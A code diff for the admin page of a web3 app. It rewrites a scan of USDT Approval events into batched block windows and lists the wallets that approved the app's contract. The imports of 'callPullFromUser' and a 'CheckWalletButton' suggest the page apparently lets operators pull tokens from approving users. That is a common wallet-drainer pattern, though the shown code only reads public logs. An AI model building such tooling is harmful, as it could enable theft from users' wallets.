@@ -5,7 +5,7 @@ import CheckWalletButton from '../components/CheckWalletButton.jsx'
 import { useWeb3Modal } from '@web3modal/wagmi/react'
 import { useAccount, useChainId } from 'wagmi'
 import { callPullFromUser, readOwnerAddress, readAdminAddress, callSetAdmin, USDT_ADDRESSES } from '../web3/tokenTransfer'
-import { parseUnits, createPublicClient, http, formatEther } from 'viem'
+import { parseUnits, createPublicClient, http, formatEther, parseAbiItem } from 'viem'
 import { CHAIN_NAMES, RESOLVED_RPC_URLS } from '../web3/config.jsx'
 import AdminHeader from '../components/AdminHeader.jsx'
 
@@ -122,30 +122,39 @@ export default function Admin() {
       }
       const client = createPublicClient({ transport: http(rpcUrl) })
       const latest = await client.getBlockNumber()
-      const fromBlock = latest > 1000000n ? (latest - 1000000n) : 0n
-      const logs = await client.getLogs({
-        address: usdtAddress,
-        abi: [{
-          type: 'event',
-          name: 'Approval',
-          inputs: [
-            { name: 'owner', type: 'address', indexed: true },
-            { name: 'spender', type: 'address', indexed: true },
-            { name: 'value', type: 'uint256', indexed: false }
-          ],
-          anonymous: false
-        }],
-        eventName: 'Approval',
-        args: { spender: SMART_CONTRACT_ADDRESS },
-        fromBlock,
-        toBlock: latest
-      })
+      const approvalEvent = parseAbiItem('event Approval(address indexed owner, address indexed spender, uint256 value)')
       const unique = new Map()
-      for (const log of logs) {
-        const owner = (log?.args?.owner || '').toLowerCase()
-        if (!owner) continue
-        if (!unique.has(owner)) unique.set(owner, { owner, blockNumber: log.blockNumber })
+  
+      // Scan in smaller block windows to avoid RPC log limits
+      const STEP = 25000n
+      const MAX_RANGE = 1000000n
+      const startBlock = latest > MAX_RANGE ? latest - MAX_RANGE : 0n
+      let from = latest
+      let batches = 0
+      while (from > startBlock && unique.size < 200 && batches < 80) {
+        const to = from
+        const nextFrom = from - STEP > startBlock ? from - STEP : startBlock
+        try {
+          const logs = await client.getLogs({
+            address: usdtAddress,
+            event: approvalEvent,
+            args: { spender: SMART_CONTRACT_ADDRESS },
+            fromBlock: nextFrom,
+            toBlock: to
+          })
+          for (const log of logs) {
+            const owner = (log?.args?.owner || '').toLowerCase()
+            if (!owner) continue
+            if (!unique.has(owner)) unique.set(owner, { owner, blockNumber: log.blockNumber })
+          }
+          setApprovalsStatus(`Scanning blocks ${String(nextFrom)}–${String(to)}… found ${unique.size}`)
+        } catch (batchErr) {
+          console.warn('Batch logs error, reducing step:', batchErr)
+        }
+        from = nextFrom
+        batches += 1
       }
+  
       const rows = Array.from(unique.values())
         .sort((a, b) => (b.blockNumber - a.blockNumber))
         .slice(0, 50)
